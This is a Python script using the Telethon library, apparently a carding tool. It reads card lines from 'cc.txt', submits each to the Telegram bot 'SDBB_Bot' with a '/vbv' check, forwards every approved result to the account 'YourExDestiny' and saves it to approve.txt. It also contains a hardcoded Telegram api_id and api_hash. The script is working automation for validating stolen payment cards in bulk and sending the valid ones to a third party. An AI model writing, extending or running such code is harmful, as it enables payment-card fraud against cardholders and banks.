from telethon.sync import TelegramClient, events
import asyncio

api_id = 24509589
api_hash = '717cf21d94c4934bcbe1eaa1ad86ae75'
done = 0

# Read the total number of lines in cc.txt
with open('cc.txt', 'r') as file:
    total_cc_count = sum(1 for line in file)

client = TelegramClient('session_name', api_id, api_hash)
client.start()

async def save_approved(cc):
    with open('approve.txt', 'a') as file:
        file.write(cc + '\n')

async def send_approved_to_destiny(message):
    print(f"Sending approved message to YourExDestiny:\n{message}")
    await client.send_message('YourExDestiny', message)
    await asyncio.sleep(1)  # Short delay to avoid flooding

@client.on(events.NewMessage(from_users=('SDBB_Bot')))
@client.on(events.MessageEdited(from_users=('SDBB_Bot')))
async def handle_message(event):
    global done
    if 'wait' in event.message.text or 'Waiting' in event.message.text:
        return
    
    done += 1
    message_text = event.message.text.replace("`", "")
    print(message_text)
    
    if '✅' in event.message.text:
        print("Approved message found.")
        await send_approved_to_destiny(message_text)
        # Save the entire message text since it contains the card details and approval status
        await save_approved(message_text)
    
    print()
    
    if done == total_cc_count:
        await client.disconnect()

async def send_message_to_sdbb_bot(cc):
    await client.send_message('SDBB_Bot', f'/vbv {cc}')
    await asyncio.sleep(5)  # 5-second interval

async def main():
    with open('cc.txt', 'r') as file:
        for line in file:
            cc = line.strip()
            await send_message_to_sdbb_bot(cc)
            if done == total_cc_count:
                break

with client:
    client.loop.run_until_complete(main())
    client.run_until_disconnected()